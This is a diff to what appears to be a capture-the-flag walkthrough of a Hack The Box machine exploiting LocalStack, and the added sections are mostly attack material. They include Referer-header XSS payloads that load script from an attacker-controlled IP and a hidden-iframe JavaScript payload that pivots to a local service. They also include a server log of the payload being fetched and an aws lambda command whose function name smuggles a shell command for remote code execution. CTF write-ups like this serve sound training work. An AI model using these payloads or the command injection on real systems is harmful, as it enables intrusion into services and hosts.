@@ -65,6 +65,8 @@ services:
 
 ## XSS on HTTP Referer
 
+Vulnerabilities reported on https://blog.sonarsource.com/hack-the-stack-with-localstack
+
 ````js
 <script>document.location="http://10.10.15.6/blah"</script>
 ````
@@ -265,6 +267,44 @@ $ cat out.json
 
 ## RCE on LocalStack
 
+````js
+//xss-5
+var iframe = document.createElement('iframe');    
+iframe.src = 'http://127.0.0.1:8080';    
+iframe.onload = function() {    
+  setTimeout(function() {    
+    iframe.parentNode.removeChild(iframe);    
+    }, 5000);    
+};    
+iframe.sandbox = 'allow-scripts';    
+iframe.style.height = '1px';    
+iframe.style.width = '1px';    
+iframe.style.position = 'fixed';    
+iframe.style.top = '-9px';    
+iframe.style.left = '-9px';
+
+document.body.appendChild(iframe);
+````
+
+````
+Referer: <script src="http://10.10.15.6/xss-5.js"></script>
+````
+or 
+````
+Referer: <script>document.location="http://127.0.0.1:8080"</script>
+````
+
+````
+$ tcpdump -i tun0 icmp
+````
+
+````
+10.10.11.112 - - [22/Mar/2022 07:36:05] "GET /xss-5.js HTTP/1.1" 200 -
+````
+
+````
+$ aws lambda create-function --function-name 'ex; ping -c 1 10.10.15.6' --zip-file fileb://index.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint-url http://s3-testing.stacked.htb --handler index.handler --runtime nodejs12.x
+````
 
 
 # Root
